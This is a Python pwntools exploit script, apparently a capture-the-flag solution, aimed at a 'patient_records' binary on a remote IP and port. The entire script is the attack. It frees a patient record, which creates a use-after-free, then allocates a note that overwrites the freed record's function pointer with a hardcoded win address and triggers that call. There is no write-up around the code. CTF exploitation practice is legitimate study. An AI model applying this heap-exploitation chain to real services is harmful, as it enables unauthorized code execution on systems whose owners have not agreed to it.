from pwn import *

# Setup
elf = context.binary = ELF('./patient_records')
#p = process('./patient_records')
p = remote('40.81.29.254', 8086)

# win function
win_addr = 0x4012b6

def admit_patient(name, severity, diagnosis):
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b"[ADMIT] Patient name: ", name)
    p.sendlineafter(b"[ADMIT] Severity (1-10): ", str(severity).encode())
    p.sendlineafter(b"[ADMIT] Diagnosis: ", diagnosis)

def view_patient(idx):
    p.sendlineafter(b"Choice: ", b"2")
    p.sendlineafter(b"[VIEW] Patient index (0-0): ", str(idx).encode())

def discharge_patient(idx):
    p.sendlineafter(b"Choice: ", b"3")
    p.sendlineafter(b"[DISCHARGE] Patient index (0-0): ", str(idx).encode())

def create_note(doctor, content):
    p.sendlineafter(b"Choice: ", b"4")
    p.sendlineafter(b"[NOTE] Doctor name: ", doctor)
    p.sendlineafter(b"[NOTE] Note content: ", content)

# =========================================================
# EXPLOIT CHAIN
# =========================================================

log.info("1. Sacrifice the first patient (Admit)...")
admit_patient(b"rua", 9, b"Dizzy")

log.info("2. Discharge the patient to the Tcache (Discharge)...")
discharge_patient(0) # Memicu Use-After-Free

log.info("3. Create a note to override the patient's Function Pointer...")
payload_doctor = b"A" * 24 # 31 char + \n
payload_content = p64(win_addr) 

create_note(payload_doctor, payload_content)

log.info("4. win function call execute")
view_patient(0)

p.interactive()
